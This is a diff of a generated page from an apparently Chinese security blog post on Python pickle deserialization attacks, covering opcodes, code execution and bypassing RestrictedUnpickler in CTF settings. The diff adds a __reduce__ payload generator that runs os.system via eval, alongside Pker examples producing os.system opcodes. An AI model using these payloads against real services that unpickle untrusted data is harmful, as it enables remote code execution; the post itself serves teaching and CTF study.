@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle%E5%9F%BA%E7%A1%80"><span class="toc-text">Pickle基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">能够序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%8F%8A%E6%8E%A5%E5%8F%A3"><span class="toc-text">常见方法及接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84opcode"><span class="toc-text">常用的opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickletools"><span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#R"><span class="toc-text">R</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i"><span class="toc-text">i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o"><span class="toc-text">o</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-text">实例化对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pker%E5%B7%A5%E5%85%B7"><span class="toc-text">Pker工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-text">作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87RestrictedUnpickler%E9%99%90%E5%88%B6"><span class="toc-text">绕过RestrictedUnpickler限制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87builtins"><span class="toc-text">绕过builtins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#code-breaking-2018-picklecode"><span class="toc-text">code-breaking 2018 picklecode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87R%E6%8C%87%E4%BB%A4"><span class="toc-text">绕过R指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%8C%87%E4%BB%A4"><span class="toc-text">i指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%8C%87%E4%BB%A4"><span class="toc-text">o指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b%E6%8C%87%E4%BB%A4"><span class="toc-text">b指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8V%E6%8C%87%E4%BB%A4%E8%BF%9B%E8%A1%8CUnicode%E7%BB%95%E8%BF%87"><span class="toc-text">利用V指令进行Unicode绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">利用内置函数获取关键字</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle%E5%9F%BA%E7%A1%80"><span class="toc-text">Pickle基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-text">能够序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%8F%8A%E6%8E%A5%E5%8F%A3"><span class="toc-text">常见方法及接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84opcode"><span class="toc-text">常用的opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickletools"><span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#R"><span class="toc-text">R</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i"><span class="toc-text">i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o"><span class="toc-text">o</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-text">实例化对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84opcode"><span class="toc-text">生成序列化的opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%86%99-reduce-%E6%96%B9%E6%B3%95%E7%94%9F%E6%88%90"><span class="toc-text">重写__reduce__方法生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pker%E5%B7%A5%E5%85%B7"><span class="toc-text">Pker工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-text">作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">使用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87RestrictedUnpickler%E9%99%90%E5%88%B6"><span class="toc-text">绕过RestrictedUnpickler限制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87builtins"><span class="toc-text">绕过builtins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#code-breaking-2018-picklecode"><span class="toc-text">code-breaking 2018 picklecode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87R%E6%8C%87%E4%BB%A4"><span class="toc-text">绕过R指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%8C%87%E4%BB%A4"><span class="toc-text">i指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%8C%87%E4%BB%A4"><span class="toc-text">o指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#b%E6%8C%87%E4%BB%A4"><span class="toc-text">b指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8V%E6%8C%87%E4%BB%A4%E8%BF%9B%E8%A1%8CUnicode%E7%BB%95%E8%BF%87"><span class="toc-text">利用V指令进行Unicode绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">利用内置函数获取关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-text">拼接绕过</span></a></li></ol></li></ol></li></ol>
     </div>
   
         
@@ -246,12 +246,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00bcd4">反序列化</a>
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ffa2c4">反序列化</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/python/" style="color: #00a596">python</a>
+                <a href="/blog/tags/python/" style="color: #00bcd4">python</a>
             </span>
             
         </span>
@@ -265,7 +265,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">4.3k字</span>
+        <span class="post-count">4.4k字</span>
       </span>
     </span>
 
@@ -366,13 +366,13 @@ pickle<span class="token punctuation">.</span>loads<span class="token punctuatio
 </tr>
 <tr>
 <td>o</td>
-<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，<strong>执行该函数（或实例化一个对象）</strong></td>
 <td>o</td>
 <td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
 </tr>
 <tr>
 <td>i</td>
-<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数<strong>执行全局函数（或实例化一个对象）</strong></td>
 <td>i[module]\n[callable]\n</td>
 <td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
 </tr>
@@ -649,18 +649,27 @@ fake<span class="token operator">=</span>pickle<span class="token punctuation">.
 <p>由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量<code>secret=&quot;This is a key&quot;</code>，是以<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;</code>形式存储的。</p>
 <p>最后再通过字节码b来执行<code>__dict__.update()</code>，即<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;.update(&#123;&#39;secret&#39;:&#39;ciallo&#39;&#125;)</code>，因此最终secret变量的值被覆盖成了<code>ciallo</code>。</p>
 <hr>
-<h1 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h1><blockquote>
+<h1 id="生成序列化的opcode"><a href="#生成序列化的opcode" class="headerlink" title="生成序列化的opcode"></a>生成序列化的opcode</h1><h2 id="重写-reduce-方法生成"><a href="#重写-reduce-方法生成" class="headerlink" title="重写__reduce__方法生成"></a>重写__reduce__方法生成</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle  
+  
+<span class="token keyword">class</span> <span class="token class-name">opcode</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+        <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__(os).system('ls /')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span>  
+  
+a<span class="token operator">=</span>opcode<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+<span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h2><blockquote>
 <p>一个以遍历Python AST的形式来自动化解析pickle opcode的工具</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">github仓库</a></p>
-<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul>
+<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
 <li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
 <li>函数调用</li>
 <li>类型字面量构造</li>
 <li>list和dict成员修改</li>
 <li>对象成员变量修改</li>
 </ul>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>pker最主要的有三个函数<code>GLOBAL()</code>、<code>INST()</code>和<code>OBJ()</code></p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>pker最主要的有三个函数<code>GLOBAL()</code>、<code>INST()</code>和<code>OBJ()</code></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">GLOBAL<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span>             <span class="token operator">=</span><span class="token operator">></span>  cos\nsystem\n
 INST<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span>         <span class="token operator">=</span><span class="token operator">></span>  <span class="token punctuation">(</span>S<span class="token string">'ls'</span>\nios\nsystem\n
 OBJ<span class="token punctuation">(</span>GLOBAL<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span>  <span class="token operator">=</span><span class="token operator">></span>  <span class="token punctuation">(</span>cos\nsystem\nS<span class="token string">'ls'</span>\no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -826,6 +835,8 @@ o.'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <p>对于已导入的模块，我们可以通过<code>sys.modules[&#39;xxx&#39;]</code>来获取该模块，然后通过内置函数<code>dir()</code>来列出模块中的所有属性</p>
 <p>注：pickle不支持列表索引、字典索引，所以我们不能直接获取所需的字符串</p>
 <p>在Python中，我们可以通过<code>reversed()</code>函数来将列表逆序，并返回一个迭代对象，<code>next()</code>函数获取迭代对象的下一个元素</p>
+<h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><p>这个方法本质上就是<a href="https://c1oudfl0w0.github.io/blog/2023/06/07/python-jail/">pyjail</a></p>
+<p><img src="/blog/2023/09/02/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231126110528861.png" alt="image-20231126110528861"></p>
 
     </div>
     
